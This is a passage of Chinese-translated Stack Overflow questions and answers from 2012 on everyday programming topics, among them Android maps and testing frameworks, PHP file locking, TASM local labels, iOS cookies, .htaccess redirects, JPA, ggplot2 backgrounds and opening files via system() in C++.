  before_filter :authenticate_user!
  ...
end 
```

最后，在我看来，我使用了这样的代码：

```
<% if can? manage, @course %>
   Only admin can work, see what happen here.
<% end %> 
```

因此，如您所见，`teacher`他们只能阅读课程，因此他们无法看到或执行管理员可以做的事情，在这种情况下，是创建课程或编辑课程。
这是我在我的在线测试应用程序中构建的，您可以参考并为您的应用程序执行相同的操作。

# android - 谷歌地图标记太多

> ID：13221786
> 
> 赞同：0
> 
> 时间：2012-11-04T19:00:28.230
> 
> 标签：android, map, google-maps-markers

我们在 MapView 中添加了大约 200 个新标记。现在应用卡住了，您无法使用 MapView。我听说过 MarkerClusterer，但没有找到更多关于如何在 Android 上使用 MarkerClusterer 的信息……或者有更好的解决方案吗？

谁能给我一个链接或写一个小教程？

谢谢 ：）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:06:09.250

您可以查看此示例 Android 项目[https://github.com/igorab/ManyPinsProject](https://github.com/igorab/ManyPinsProject)

它根据`MapView`缩放级别显示有限数量的标记。

这是来自谷歌的教程[https://developers.google.com/maps/articles/toomanymarkers](https://developers.google.com/maps/articles/toomanymarkers)

正如@CommonsWare 所说，它仅适用于 JavaScript 版本或 GoogleMaps，但您可能会在那里找到有用的东西。例如，他们有一个指向`MarkerClusterer`js 源代码的链接。也许您可以找到一种方法将其应用于 Android。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-11-04T22:44:59.310

你可以使用这个库[——Android MapView Balloons](https://github.com/jgilfelt/android-mapviewballoons)。该项目提供了一种在使用 Android 地图时使用简单信息气球注释地图叠加项目的简单方法。

# php - 读写时锁定文件

> ID：13221787
> 
> 赞同：0
> 
> 时间：2012-11-04T19:00:30.317
> 
> 标签：php, file, fopen

我有一个存储一些值的文件。用户可以向该文件添加内容，并且该文件中的计数器会更新。但如果两个用户打开文件，他们将得到相同的计数器 ( `$arr['counter']`)。我应该怎么办？也许我可以为一位用户锁定文件并在他更新计数器并将一些内容添加回文件后释放锁定？或者PHP一旦打开文件就已经锁定了我不需要担心？这是我当前的代码：

```
 $handle = fopen($file, 'r');
    $contents = fread($handle, filesize($file));
    fclose($handle);       

    $arr = json_decode($contents);

    //Add stuff here to $arr and update counter $arr['counter']++

    $handle = fopen($file, 'w');
    fwrite($handle, json_encode($arr));   
    fclose($handle); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:05:00.537

PHP具有[`flock`](http://www.php.net/manual/en/function.flock.php)在写入文件之前锁定文件的功能，例如，

```
$handle = fopen($file, 'r');
$contents = fread($handle, filesize($file));
fclose($handle);       

$arr = json_decode($contents);

//Add stuff here to $arr and update counter $arr['counter']++

$handle = fopen($file, 'w');
if(flock($handle, LOCK_EX))
{
    fwrite($handle, json_encode($arr));
    flock($handle, LOCK_UN);        
}
else
{
    // couldn't lock the file
}
fclose($handle); 
```

# android - Android：Robotium v s android 测试框架

> ID：13221788
> 
> 赞同：11
> 
> 时间：2012-11-04T19:00:33.970
> 
> 标签：android, robotium, ui-testing

每个人都使用 Robotium 进行 GUI 测试。

你能告诉我什么Android原生测试框架不能做Robotium能做的吗？据我所知，Robotium 可以用作黑盒测试，所以我不需要了解应用程序资源。还有什么？

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2013-05-04T15:26:12.503

## 机器人馆

***优点：***

*   支持带有 webViews 的混合应用程序。
*   每当使用 UIatomator 编写复杂的测试用例时，您都可以将测试绑定到被测应用程序的唯一 ID，这需要您做大量工作
*   在 UIatomator 中使用了 UiAutomatorTestCase Instrumentation，它不能让您调用当前活动并检查是否加载了适当的活动，您不能调用连接或音频管理器进行 wi-fi 或声音测试。在 Robotium 中，您可以轻松调用此类 gem，从而大大提高测试效率
*   开源项目，因此您可以根据需要修改工具

***缺点：***

*   无法测试`android:process`标签用于不同活动的多进程应用程序。

***示例代码：***

![机器人 API 示例](../Images/988e96f6f18b505a586bc7aca5b741c4.png)

## UIautomator

***优点：***

*   测试用例独立于被测应用程序工作的过程。因此，它可以用于使用附加库或在其他进程中运行活动的地方，如果测试需要在多个应用程序之间切换，也很有用。

***缺点：***

*   仅适用于 Android 4.1 或更高版本！

*   获取 ui-object 实例时不能使用源 ID。这意味着如果应用程序结构在一个布局上发生更改，您需要重构您的测试（这个问题可以通过为每个 ui 元素使用标签来解决）

*   您无法获取当前活动或仪器。这意味着您在测试开发方面受到限制，并且没有使用许多 android 的 api 方法进行测试。

*   难以调试，您需要有脚本来快速构建和启动测试并查看输出

***层次结构查看器：***

![使用 UIautomator 的工具](../Images/7b8cef88216ef55716ff01c84b362d57.png)

我认为这两个工具都很好，在测试期间在应用程序之间切换的可能性肯定很棒。您应该根据需要选择工具。我建议将 Robotium 用于不需要在应用程序之间切换的测试，因为它具有简单的方法和机会，可以使用 Android API 以简短的代码编写灵活和智能的测试，甚至可以覆盖 webview 和 milti-process 中的网页测试应用程序非常不寻常。

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-11-04T19:45:29.593

Robotium 和本机工具之间的区别在于，使用 Robotium 编写测试非常简单。它基本上是来自 Solo 实例对象的指向和单击。

您可以在此处下载 JAR 文件和示例项目以自行测试[。](http://code.google.com/p/robotium/downloads/list?can=3&q=&colspec=Filename%20Summary%20Uploaded%20ReleaseDate%20Size%20DownloadCount)

**更新**

例如，我正在测试一个带有一些编辑文本、一个微调器和一个在我单击微调器选项时显示的弹出对话框的活动。请注意，使用其他方法，填充弹出对话框的字段是一个真正的痛苦。

下面是如何声明测试类和 Robotium 的初始化

```
import com.jayway.android.robotium.solo.Solo; //Using Robotium

//Robotium uses ActivityInstrumentationTestCase2.
//Note here the use of the template
public class AddNewQuestionTests extends
                ActivityInstrumentationTestCase2<AddNewQuestion> {

    public AddNewQuestionTests(Class<AddNewQuestion> name) {
        super(name);
    }

    public AddNewQuestionTests() {
        super(AddNewQuestion.class);
    }

    private Solo solo;

    protected void setUp() throws Exception {
        super.setUp();
//Initialize Solo with the instrumentation and the activity under test
        solo = new Solo(getInstrumentation(), getActivity());       
    } 
```

这是测试方法：

```
 public void testHappyPathAddScaleQuestion() {

            // Type question title
            solo.clickOnEditText(0); //find the EditText, and click it

            solo.enterText((EditText) getActivity().findViewById(

//find the EditText, and put some string
                R.id.activity_add_new_question_editText_question_title),
                            "Question title scale ");
            // Type question description
            solo.clickOnEditText(1);
            solo.enterText((EditText) getActivity().findViewById(
                            R.id.activity_add_new_question_editText_question_description),
                            "Question description scale");
            // Type the question
            solo.clickOnEditText(2);
            solo.enterText((EditText) getActivity().findViewById(
                            R.id.activity_add_new_question_editText_question),
                            "Question scale");

            // Click the spinner and then the "Scale" question type
//Press an spinner option
            solo.pressSpinnerItem(0, 4);

//Wait for the popup dialog title to show up. When robotium reads it, continue working          solo.waitForText(getActivity().getResources().getString(R.string.activity_add_new_question_scale_selection_dialog_message)); 
            // Type minimum and maximum ranges
            solo.clickOnEditText(0);
            solo.searchText(getActivity().getResources().getString(R.string.activity_add_new_question_maximum_value_hint));
            solo.clickOnView(solo.getCurrentEditTexts().get(0));
            solo.enterText(0, "34");
            solo.clickOnView(solo.getCurrentEditTexts().get(0));
            solo.enterText(1, "55");

            // Click ok to close the dialog
            solo.clickOnButton(getActivity().getResources().getString(R.string.OK));

            // Click ok to get an ok message
            solo.clickOnButton(getActivity().getResources().getString(R.string.OK));

            //Wait for the ok toast message
            boolean flagOKDatabase=solo.waitForText(getActivity().getResources().getString(R.string.database_success_storing_data),1,120);
            assertEquals("Something wrong happened with the database", true, flagOKDatabase);
        } 
```

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-11-05T11:28:15.290

在 android 原生的检测框架上使用 robotium 没有任何缺点。那是因为当使用robotium时，你仍然可以在没有它的情况下做任何你能做的事情，但你也可以使用很多有用的功能。

还有其他一些 android 自动化框架，但绝对值得一看。如果您在 Web 视图中有任何代码，这些代码将特别有用，因为这是 robotsium 真正让自己失望的地方。

[https://github.com/calabash/calabash-android](https://github.com/calabash/calabash-android)

[https://github.com/calabash-driver/calabash-driver](https://github.com/calabash-driver/calabash-driver)

[http://testdroid.com/](http://testdroid.com/)

# assembly - TASM 中的本地标签：符号已定义

> ID：13221789
> 
> 赞同：0
> 
> 时间：2012-11-04T19:00:57.190
> 
> 标签：assembly, labels, tasm

我想在我的程序中使用本地标签来防止在我的程序中使用公共标签的前缀。我尝试使用本地标签 (@@)。根据我的书，“本地标签的生命周期只会向前和向后延伸到下一个非本地标签”。但是，当我尝试编译文件时，会返回以下错误消息：

```
Turbo Assembler  Version 3.1  Copyright (c) 1988, 1992 Borland International

Assembling file:   test.ASM
**Error** test.ASM(20) Symbol already defined elsewhere: @@EXIT
**Error** test.ASM(33) Symbol already defined elsewhere: @@EXIT
Error messages:    2   
Warning messages:  None
Passes:            1   
Remaining memory:  472k 
```

这是源代码：

```
Data    segment
Data    ends

Stack1  segment Stack "Stack"
    dw  256 dup(?)
Stack1  ends

Code    segment
assume cs:Code, ss:Stack1, ds:Data
.386

proc1   proc
    ; some code here
    @@exit:
    ret
proc1   endp

proc2   proc
    ; some code here
    @@exit:
    ret
proc2   endp

main    proc
    mov ax, Data
    mov ds, ax

    @@repeat:
    call    proc1
    call    proc2
    jz  @@repeat

    @@exit:
    mov ah, 4Ch
    mov al, 0
    int 21h     
main    endp

Code    ends

end main 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-06T02:52:16.593

默认情况下不启用本地符号。要启用它，`LOCALS`源中需要该指令。该指令必须放在单独的行中，并且可以多次使用。它需要一个由两个字符组成的参数。此文本将用作所有本地符号的前缀。

例如：`LOCALS @@`或`LOCALS ZZ`

# ios - 使用 AFNetworking，每次启动应用程序后 PHPSESSID 都会发生变化

> ID：13221793
> 
> 赞同：1
> 
> 时间：2012-11-04T19:01:20.533
> 
> 标签：ios, session, cookies, afnetworking

我第一次启动我的应用程序并登录时，我得到一个会话，我需要做一些查询（这是我知道谁登录的方式）。

无论如何，如果我终止应用程序并重新启动它，我会得到一个新的会话 ID。为什么？过去，我的 ios 应用程序存储了会话 cookie。我想。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-05T07:12:52.057

您需要在应用程序终止之前手动将 cookie 保存到磁盘，`NSCoding`然后在应用程序启动时加载它们，如下所示：

```
NSData *cookiesData = [[NSUserDefaults standardUserDefaults] objectForKey:@"SavedCookies"];
if ([cookiesData length] > 0) {
    for (NSHTTPCookie *cookie in [NSKeyedUnarchiver unarchiveObjectWithData:cookiesData]) {
        [[NSHTTPCookieStorage sharedHTTPCookieStorage] setCookie:cookie];
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T19:13:52.937

HTTP 会话被设计为短暂的。通常，这被设置为浏览器的生命周期，或者最近设置为浏览器选项卡的生命周期。一些浏览器现在将在应用程序启动之间存储会话，只要浏览器选项卡保持打开状态，但这对用户来说是一种方便。

如果您以前的应用程序在应用程序启动和终止之间保持会话，那么这是关于如何存储会话的实现中的一个错误。

我不建议使用会话来存储长期存在的数据。为此，使用`NSUserDefaults`或考虑使用 SqlLite 存储。

编辑地址评论问题：

> 我应该如何构建应用程序，以便用户在安装应用程序时只需登录一次。

有多种方法可以实现这一点，具体取决于您拥有系统的哪些部分。

从概念上讲，最简单的场景是您拥有 Web 服务。在这种情况下，您可以存储用户凭据，并且每次启动应用程序时，让用户登录，并像现在一样使用该会话 ID。

在为此构建 UI 时，我会有一个复选框，要求用户记住我；基本上是要求他们允许在手机上存储他们的信用。

技巧部分是如何正确保护用户凭据。

# .htaccess - 如何使用 htaccess 将 example.com/x/restofurl 重定向到 example.com/y/restofurl

> ID：13221806
> 
> 赞同：2
> 
> 时间：2012-11-04T19:02:18.623
> 
> 标签：.htaccess, http-redirect

我有一个像`example.com/x`

如何`example.com/y`使用 htaccess 将其重定向到。

顺便说一句，我不想​​失去其余的网址。

当前的 .htaccess 文件看起来像；

```
<ifModule mod_rewrite.c>
    RewriteEngine On

    RewriteCond %{REQUEST_FILENAME} !-s
    RewriteRule ^(.*)\.[\d]+\.(css|js)$ $1.$2 [L]

        RewriteCond %{REQUEST_FILENAME} !-f
        RewriteRule ^(.*)$ index.php/$1 [NC,QSA,L]

</ifModule> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:04:51.250

查看[文档](http://httpd.apache.org/docs/2.2/rewrite/remapping.html)：

```
RewriteEngine on
RewriteRule ^/x/(.+) /y/$1 [R,L] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-09T07:06:30.110

好的，我终于找到了解决方案；在这种情况下，基本重定向 301 就足够了；

```
redirect 301 /x /y 
```

# java - 在内存数据库中使用的 EJB 应用程序的持久性单元是什么样的？

> ID：13221809
> 
> 赞同：0
> 
> 时间：2012-11-04T19:02:41.190
> 
> 标签：java, jpa, ejb, derby, jta

我有一个 Java 应用程序，我曾经用内存中的 Derby 驱动程序使用这个持久性单元进行测试：

```
<persistence-unit name="TestPU" transaction-type="RESOURCE_LOCAL">
<provider>org.hibernate.ejb.HibernatePersistence</provider>
<properties>
  <property name="hibernate.connection.url" value="jdbc:derby:memory:ProjectDB"/>
  <property name="hibernate.connection.driver_class" value="org.apache.derby.jdbc.EmbeddedDriver"/>
  <property name="hibernate.dialect" value="org.hibernate.dialect.DerbyDialect"/>
  <property name="hibernate.hbm2ddl.auto" value="create-drop"/>
  <property name="hibernate.connection.username" value=""/>
  <property name="hibernate.connection.password" value=""/>
</properties> 
```

现在我添加了一个 EJB 服务层，从那以后我一直无法在内存数据库中使用相同的持久性单元来编写工作。以下工作正常，但我想把它放在内存中

```
<persistence-unit name="moduleNamePU" transaction-type="JTA">
<provider>org.hibernate.ejb.HibernatePersistence</provider>
<jta-data-source>jdbc/sample</jta-data-source>
<properties>
  <property name="hibernate.hbm2ddl.auto" value="create-drop"/>
</properties> 
```

如何更改第二个持久性单元以便在内存数据库中使用？

编辑：作为 EJB 容器，我使用 Glassfish 3.1

实体服务：

```
@Stateless
@Local(value=EntityServiceLocal.class)
public class EntityService implements EntityServiceLocal {

    @EJB
    private EntityDaoLocal entityDao;

    @Resource
    private SessionContext ctx;

    public void setEntityDao(EntityDaoLocal entityDao) {
        this.entityDao = entityDao;
    }
} 
```

道层服务：

```
@Stateless
public class EntityDao implements EntityDaoLocal {

    @PersistenceContext
    private EntityManager em;
} 
```

# java - Java 2D 数组复制

> ID：13221810
> 
> 赞同：0
> 
> 时间：2012-11-04T19:02:48.747
> 
> 标签：java

我有一个二维数组，我只需要将第一行复制到另一个相同大小的数组中。这样做的最佳方法是什么？我试过这个：

```
public static int[][] buildCME(int[][] array){

    int [][] arrayCME = new int[array.length][array[0].length];

    for(int y = 1; y < array.length; y++)
    {

        for (int x = 0; x < 1; x++)
        {

            arrayCME[y][x] = array[y][x];

        }
    } 
```

然而，这只是给我第一行的 0，我认为这与我的 int 初始化有关。我创建了这个 for 循环，因为我认为它比在普通 for 循环中创建一个 if 语句来解释整个二维数组更容易。谢谢您的帮助！

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:17:45.147

您的代码从第二行开始复制第一列（您的内循环是 x < 1）（外循环从 1 开始）。如果要复制第一行，请执行

```
 for (int x = 0; x < array[0].length; x++)
 {
      arrayCME[0][x] = array[0][x];
 } 
```

为了更有效地执行此操作，您可能需要查看[`System.arraycopy`](http://docs.oracle.com/javase/1.4.2/docs/api/java/lang/System.html#arraycopy%28java.lang.Object,%20int,%20java.lang.Object,%20int,%20int%29)：

```
System.arraycopy(array[0],0,arrayCME[0],0,array[0].length); 
```

`System.arraycopy` should perform a more efficient copy since it is a [native](http://en.wikipedia.org/wiki/Java_Native_Interface) method. Furthermore, some JVMs like for example the HotSpot JVM treat this method as an *intrinsic*. A JVM will usually substitute calls to intrinsics methods with architecture specific code, which in the case of `arraycopy` might be machine code that copies memory directly.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T19:04:58.177

这是因为您的外部循环从 1 开始，而不是 0，并且由于数组从 0 开始，所以第一行将始终保持不变。

# ember.js - 使用 {{view}} 帮助器实例化控制器类？

> ID：13221813
> 
> 赞同：0
> 
> 时间：2012-11-04T19:03:19.337
> 
> 标签：ember.js

在`connectOutlet("basename")`自动创建*BasenameController*的实例时，我想知道是否有办法使用`{{view}}`-helper 来做同样的事情。

我已经尝试了一些我在示例中看到的东西，但它们似乎都不起作用：

~~`{{view controllerBinding=App.BasenameController}}`~~

~~`{{view controllerBinding=App.basenameController}}`~~

~~`{{view controllerBinding="App.BasenameController"}}`~~

~~`{{view controllerBinding="App.basenameController"}}`~~

我也尝试过使用`controller`而不是做同样的事情`controllerBinding`，不幸的是没有成功，而且我也无法找出它们两者之间的确切区别。

有人知道如何实现我的目标吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-05T03:50:58.550

您可能想使用插座。connectOutlet/outlet 函数用于渲染其他控制器/视图对。

假设我们有一个人视图，但在该视图中我们希望有另一个控制器/视图对。为此，我们需要使用一个命名的插座，我们的模板看起来像这样。

```
Person View!
{{name}} = the person's name!
{{controller}} = PersonController!
{{outlet other}} = our outlet 
```

然后在路由器内部，当您想将另一个控制器/视图附加到该插座时，您可以简单地在 personController 上使用 connectOutlet。

```
router.get('personController').connectOutlet('other', 'other'); 
```

这会将 OtherController 和 OtherView 连接在一起并将它们显示在您的模板中。第一个参数是插座名称，第二个是控制器/视图。

这使您可以轻松地将不同的控制器和视图交换到该插座上。例如，使用不同的 connectOutlet api，我们可以

```
router.get('personController').connectOutlet({
 outletName: 'other',
 controller: router.get('carsController'),
 viewClass: App.CarsView
}); 
```

...

顺便说一句，回答你原来的问题。您可以通过执行以下操作从您的视图中访问其他控制器`{{view controllerBinding="controller.target.otherController"}}`：每个控制器都有一个指向路由器的目标属性。但是，我不建议使用此代码。它很脆，很难测试，很难调试，以后还会回来咬你。

# php - 在 PHP pdo 中如何使用增量标识符

> ID：13221814
> 
> 赞同：1
> 
> 时间：2012-11-04T19:03:19.413
> 
> 标签：php, mysql, pdo

我有以下挑战：

“任务”表：

```
tasksId     int
listId      int
taskOrder   float 
```

如果我想将所有任务从列表 2 移到列表 3，我会执行以下操作：

```
// pseodo code //

@lastTaskOrder = last task order in list 3
loop - {
UPDATE tasks SET taskOrder = @lastTaskOrder + 1, listId = 3 WHERE listId = 2;        
@lastTaskOrder++
} 
```

因此 taskOrder 保持唯一。

如果我想将所有任务从列表 2 移到列表 3 的*开头*，我会执行以下操作：

```
// pseodo code //

@firstTaskOrder = first task order in list 3
@delta = @firstTaskOrder / @numberOfTasksToMove
UPDATE tasks SET taskOrder = @firstTaskOrder + @delta, listId = 3 WHERE listId = 2;        
@firstTaskOrder = @firstTaskOrder + @delta 
```

mySQL + PDO + PHP可以吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:27:46.313

简短的回答：是的。

更长的答案涉及一些代码。要更新您的 list_ids 并根据旧列表中的最高当前值增加它们，我必须使用带有窗口函数的子查询：

```
UPDATE tasks
SET list_id = :toList,
    task_order = 
                (SELECT MAX(task_order) from tasks where list_id = :toList) 
                + t2.task_sort_order
FROM ( SELECT task_id, 
    row_number() OVER (PARTITION BY list_id order by task_order) 
                AS task_sort_order 
    FROM tasks ) t2 
WHERE tasks.task_id = t2.task_id AND tasks.list_id = :fromList 
```

**编辑**这是从第一个版本大量编辑的。我已经抛弃了所有的 PHP，只支持显示 SQL。我更改了列名，因为我的 Postgres 版本抱怨驼峰式名称。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T21:15:21.910

事实证明这比我想象的要容易。我花了 2 个小时，但我明白了：

```
SET @start=100;
SET @delta=1.5;
UPDATE tasks SET taskOrder = @start:= (@start+@delta), listId = 3
WHERE listId=2
ORDER BY taskOrder 
```

我用正确的值对这个查询进行了 PDO

# java - Java Sevlet 映射。欢迎文件列表

> ID：13221820
> 
> 赞同：6
> 
> 时间：2012-11-04T19:04:09.617
> 
> 标签：java, web.xml

在我的 web.xml 文件中，我有这个

```
<!-- WELCOME FILE LIST -->
<welcome-file-list>
    <welcome-file>/index</welcome-file>
</welcome-file-list> 
```

映射到这个

```
<!-- SERVLET FOR THE HOME PAGE -->
<servlet>
    <servlet-name>HomePageServlet</servlet-name>
    <servlet-class>com.gmustudent.HomePageServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>HomePageServlet</servlet-name>
    <url-pattern>/index</url-pattern>
</servlet-mapping> 
```

当我把它放在地址栏中时，我得到了我的主页站点，并且 servlet 根据请求获取了我的所有内容。

```
http://localhost:8086/gmustudent/index 
```

但是，这给了我一个 404

```
http://localhost:8086/gmustudent/ 
```

当索引没有明确说明时，为什么我的欢迎文件列表没有抓取该欢迎文件 servlet？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-04T19:08:02.920

```
 http://localhost:8086/gmustudent/ 
```

gmustudent 是您的 web 应用程序的上下文根。index 是`resource`您要访问的。

您像下面一样配置欢迎文件，删除前面的 / ：

```
<welcome-file>Index</welcome-file> 
</welcome-file-list> 
```

访问

```
 http://localhost:8086/gmustudent/ 
```

# android - 从 Fragment2 调用来自 Fragment1 的菜单方法

> ID：13221824
> 
> 赞同：0
> 
> 时间：2012-11-04T19:04:43.357
> 
> 标签：android, android-fragments, android-viewpager

我有一个 MainActivity 包含对 FragmentAdapter 和 ViewPage 的引用。在此活动中，我将两个片段添加到列表，然后将此列表添加到 FragmentAdapter：

```
fragments.add(Fragment.instantiate(this, Fragment1.class.getName()));       
fragments.add(Fragment.instantiate(this, Fragment2.class.getName())); 
```

现在，我可以成功地滑过这两个片段。实际上，它们都是ListFragments。在每个片段中，我列出了许多项目。

对于每个项目，我可以单击按住，然后会出现一个菜单项。

出现的问题是，在 Fragment1 上，在 Fragment1`public boolean onContextItemSelected(MenuItem item)`中成功调用了（在此片段中添加了断点）。

在 Fragment2 中执行相同的测试时，会调用来自 Frag1 的断点，而不是来自 Frag2。而且，显然，来自 Frag1 的数据显示在 Frag2 中。

有人见过这个吗？

我在两个片段中实例化菜单，如下所示：

```
@Override
    public void onCreateContextMenu(ContextMenu menu, View v, ContextMenuInfo menuInfo) {
        super.onCreateContextMenu(menu, v, menuInfo);
        menu.add(Menu.NONE, R.id.share, Menu.NONE, getString(R.string.share));
        menu.add(Menu.NONE, R.id.delete, Menu.NONE, getString(R.string.delete_all));
    } 
```

问候， 费利佩

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:27:50.177

基本上，首先实例化的片段将获得优先权。有关使用 invalidateOptionsMenu 的解决方案，请参阅[此](https://developer.android.com/reference/android/support/v4/app/ActivityCompat.html#invalidateOptionsMenu%28android.app.Activity%29)链接。基本上选项菜单会一直存在，直到你告诉 android 它是无效的。在旧系统上，您可以更改 onPrepareOptionsMenu 中的菜单，但由于操作栏具有选项菜单中的图标，您需要完全销毁它。

因此，当您分页到新片段时，只需使选项菜单无效。对于旧设备，检查 onPrepareOptionsMenu 以查看可见的片段并显示这些选项。

# android - 试图让我的自定义微调器看起来工作

> ID：13221828
> 
> 赞同：0
> 
> 时间：2012-11-04T19:05:04.933
> 
> 标签：android, spinner

我已经通过更改它的颜色来编辑微调器图像。然后使用 draw9patch.bat 工具将其创建为适当的 9-patch 文件，然后将其重命名为 spinner_updated.9.png，然后将其放入我的“res/drawable”文件夹中。所以我然后检查了这个链接只是为了了解实现自定义微调器：

[如何在小部件右侧创建没有向下三角形的android微调器](https://stackoverflow.com/questions/4058360/how-to-create-android-spinner-without-down-triangle-on-the-right-side-of-the-wid)

我尝试使用 lencinhaus 和 Aleadam 方式，但是当我尝试在我的应用程序中实际使用它时，我不断收到错误消息：

```
Failed to convert @android:drawable/spinner_updated into a drawable
Couldn't resolve resource @android:drawable/spinner_updated 
```

我究竟做错了什么？一旦我有了想要用于我的微调器的图像以使其实际显示在应用程序中，我会怎么做？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T19:06:47.367

如果您使用自己的可绘制对象，则需要使用：

```
@drawable/spinner_updated 
```

指示应用程序查看 Android的`@android:`内置资源，而不是您自己的。

# r - 如何在线性模型的功能中使用色标填充背景？

> ID：13221830
> 
> 赞同：4
> 
> 时间：2012-11-04T19:05:14.777
> 
> 标签：r, colors, ggplot2, scale, data-visualization

我正在分析 Alberto Cairo 的“功能艺术”中的一个 datavis 示例（我推荐给你）

在那本书中，有这个例子

![http://img546.imageshack.us/img546/8327/snap1026.png](../Images/32f179eb2bcce0d0ed5db1b07bab2afd.png)

我在 R 中尝试。在左下图（散点图）

我使用书中的数据，并根据人口函数计算有效军队，`lm(efect ~ pop)`并根据人口+效应计算预算

这里是一个问题：如何使用颜色代表 BUDGET 值的色标（渐变）绘制散点图的背景？

之后，我想用预算的颜色来表示点（人口、效果）。这样，我可以将国家预算与人口+效应函数的估计预算进行比较

我知道基本的 R，我已经安装了**ggplot2**和**scales**包

我想要一个类似于

![在此处输入图像描述](../Images/7143439f7153eb008bcd9243f19bad06.png)

但颜色正确。

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-05T09:48:48.800

要获得背景，您可以使用它`geom_raster`来获得您想要的效果。我将使用@GeekOnAcid 建议的相同数据集：

首先获取数据并拟合回归模型：

```
crime = read.csv("http://datasets.flowingdata.com/crimeRatesByState2005.tsv", 
              header=TRUE, sep="\t")
 ##Fit the regression model
 m = lm(crime$burglary ~ crime$murder) 
```

接下来我们为背景颜色创建一个网格：

```
##Create a grid for the background colour
x = seq(1, 10, length.out=100)
y = seq(400, 1200, length.out=100)
z = expand.grid(x,y) 
```

现在我们需要一个渐变颜色的距离度量。我只是使用回归线的平方距离：

```
z$grad = (z[,2] - (398.3 +  62.2*z[,1]))^2 
```

然后绘制：

```
require(ggplot2)    
ggplot(z) + geom_raster(aes(Var1, Var2, fill=grad)) + 
    geom_point(data=crime[1:15,], aes(murder, burglary, size=population),pch=1 ) + 
    geom_text(data=crime[1:15,], 
              aes(murder, burglary, label=state), 
              hjust=-0.2, size=4) + 
    scale_size_continuous(range=c(1,10)) + 
    scale_fill_continuous(high="red", low="white", trans="sqrt") +
    xlab("Murder") + ylab("Burglary")  + 
    guides(size=FALSE, fill=FALSE) +
    scale_y_continuous(expand=c(0, 0)) + 
    scale_x_continuous(expand=c(0, 0)) 
```

要得到：

![在此处输入图像描述](../Images/74565acc1c0f819e28bbbcdb6839a44d.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T22:33:55.797

为了帮助您入门，请查看[Nathan Yau 的本教程](http://flowingdata.com/2010/11/23/how-to-make-bubble-charts/)，他展示了如何使用 R 中的基本图形创建气泡图。我只是检索了他的解决方案以使其与您的示例更相关。

```
#get some example data
crime <- read.csv("http://datasets.flowingdata.com/crimeRatesByState2005.tsv", 
                  header=TRUE, sep="\t")
#define the radius of circles
radius <- sqrt( crime$population/ pi )
#makes your plot, bg defines colour, inches scales circles
symbols(crime$murder[1:15], crime$burglary[1:15], circles=radius[1:15], 
        inches=0.5, bg=gray(0.9), xlab="Murder Rate", ylab="Burglary Rate")
#makes your labels, you can offset them by adding values to x and y arguments
text(crime$murder[1:15], crime$burglary[1:15], crime$state[1:15], cex=0.6) 
```

![在此处输入图像描述](../Images/e941de7794faed3f7748b3d880d9a8d0.png)

背景的东西会很棘手，但你确定你真的需要它吗？即使有不同的颜色，它也会看起来很丑......

# c++ - 如何在 C++ 中打开文件（记事本除外）

> ID：13221831
> 
> 赞同：2
> 
> 时间：2012-11-04T19:05:28.597
> 
> 标签：c++, system

我想知道如何打开记事本以外的文件......我们的教授给了我们一个例子：

```
s = "notepad.exe test.txt";
system(s.c_str()); 
```

这将打开“notepad.exe”的文件类型和“test.txt”的文件名

主要问题：

现在，我想知道是否有办法打开其他类型的文件，例如 Microsoft Excel、Microsoft Word、Visual Studio 或 7zip。

我的尝试在新的 cmd.exe 中打开了一些东西（因为 START 关键字）：

```
fileNeededtoBeOpened = "START \"New Microsoft Office Excel Worksheet.xlsx\"";
system(fileNeededtoBeOpened.c_str()); 
```

（此代码与我的原始代码略有不同，我试图从矢量打开文件......）但我真正需要知道的不是“notepad.exe”或“START”，而是有一个不同的命令打开不是 .txt 的不同文件类型

另外，附带说明一下，我在互联网上读到使用 system() 打开文件是不安全的，这是正确的吗？

**我自己找到了答案……对于那些好奇的人，这里是答案：**

*   打开文本文件：system(notepad)
*   打开一个excel文件：system(start excel)
*   打开word doc文件：system(start winword)
*   打开 7z 文件：system(start 7zFM)
*   打开 Visual Studio 文件：system(start devenv)

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:15:56.767

我想你很困惑。

系统像在命令行上一样执行命令（在开始菜单下的运行提示中键入 cmd 以获取该命令）。

因此，当您键入时，`notepad.exe test.txt`它会说：

> 打开`notepad.exe`系统路径上的程序（以便命令行可以找到它来执行该程序），并将参数传递`test.txt`给它。

记事本本身决定如何处理`test.txt`，在这种情况下它会打开它。

因此，您可以告诉它运行任何命令（程序/可执行文件）并将任何参数传递给它。如果 excel 在您的系统路径上，您可能只需键入`excel.exe`以从系统命令中打开它。否则，找到安装excel的位置，并使用excel.exe的整个路径引用它，它会正常工作。

例如，在我的计算机上，执行“C:\Program Files\Microsoft Office\Office12\EXCEL.EXE”将从命令行打开 excel。我可以通过在 Excel.exe" 部分之后添加更多信息（如文件名）来向它传递更多参数，就像您在记事本示例中所做的那样。执行该行时，使用系统命令应该具有等效的行为。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T19:28:20.740

